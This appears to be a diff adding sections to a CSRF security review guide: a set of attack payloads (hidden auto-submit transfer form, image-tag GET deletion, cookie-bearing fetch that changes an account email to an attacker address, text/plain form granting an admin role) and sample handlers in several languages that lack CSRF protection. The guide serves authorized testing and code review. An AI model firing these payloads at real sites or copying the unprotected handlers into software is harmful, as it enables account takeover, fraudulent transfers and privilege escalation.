@@ -30,6 +30,119 @@ The unsafe assumption is that only same-origin pages can trigger important actio
 | **Framework bypass** | `@csrf_exempt`, `csrf().disable()`, omitted `[ValidateAntiForgeryToken]` |
 | **High-risk gaps** | MFA disable, payout flows, admin actions without reauthentication |
 
+## Attack Payloads
+
+Use these in authorized tests when a state-changing endpoint trusts session cookies alone. Host the HTML on a domain the victim visits while logged in.
+
+### Pattern 1: Hidden auto-submit form (classic CSRF)
+
+```html
+<form action="https://bank.example/transfer" method="POST" id="csrf">
+  <input type="hidden" name="to" value="attacker-acct">
+  <input type="hidden" name="amount" value="10000">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+```
+
+### Pattern 2: GET mutation (unsafe side effect)
+
+```html
+<img src="https://app.example/admin/delete?userId=42" width="0" height="0">
+```
+
+### Pattern 3: `fetch` with cookies (cookie-authenticated API)
+
+```javascript
+fetch('https://app.example/api/settings/email', {
+  method: 'POST',
+  credentials: 'include',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ email: 'attacker@evil.example' })
+});
+```
+
+### Pattern 4: Cross-origin form to JSON endpoint (content-type bypass attempts)
+
+```html
+<form action="https://app.example/api/role" method="POST" enctype="text/plain">
+  <input name='{"role":"admin","x":"' value='"}'>
+</form>
+```
+
+### Pattern 5: Multipart or file upload CSRF
+
+```html
+<form action="https://app.example/api/avatar" method="POST" enctype="multipart/form-data">
+  <input type="file" name="file">
+</form>
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Locate state-changing handlers and confirm anti-CSRF middleware or tokens are enforced—not disabled for convenience.
+
+### Python
+
+```python
+from flask import request
+@app.route("/transfer", methods=["POST"])
+def transfer(): ...  # no flask-wtf CSRF, no token check
+@app.route("/api/x", methods=["POST"])
+@csrf_exempt
+def api_x(): ...
+```
+
+Django: views without `csrf_protect`; `csrf_exempt` decorator. FastAPI: cookie session without `CSRFMiddleware`.
+
+### Java
+
+```java
+@PostMapping("/transfer")
+public void transfer(...) { }  // missing @CsrfToken or Spring Security CSRF
+
+http.csrf().disable();
+```
+
+Spring Security: `CsrfFilter` disabled globally. JAX-RS: POST without synchronizer token.
+
+### C#
+
+```csharp
+[HttpPost]
+public IActionResult ChangeEmail(EmailModel m) { }  // no [ValidateAntiForgeryToken]
+
+services.AddControllers().AddJsonOptions(...); // antiforgery not validated on API
+```
+
+ASP.NET: `[IgnoreAntiforgeryToken]`, missing `[ValidateAntiForgeryToken]` on MVC actions.
+
+### JavaScript (Node.js)
+
+```javascript
+app.post('/settings', (req, res) => { /* cookie session, no csrf token */ });
+router.post('/admin/role', requireLogin, updateRole);  // no csrf/cors check
+```
+
+Express: `cookie-parser` + session without `csurf` or double-submit cookie. SameSite-only reliance on APIs that accept simple POST bodies.
+
+### Go
+
+```go
+http.HandleFunc("/transfer", transfer) // POST, session cookie, no CSRF token
+mux.Handle("/api/email", csrfOff(handler))
+```
+
+Gorilla/mux or chi routes without CSRF middleware on cookie-authenticated POSTs.
+
+### PHP
+
+```php
+// No CSRF token in form handler
+if ($_SERVER['REQUEST_METHOD'] === 'POST') { update_account($_POST); }
+```
+
+Laravel: `@csrf` omitted; `VerifyCsrfToken` except list too broad.
+
 ## Sample Vulnerable Code in Python
 
 ```python
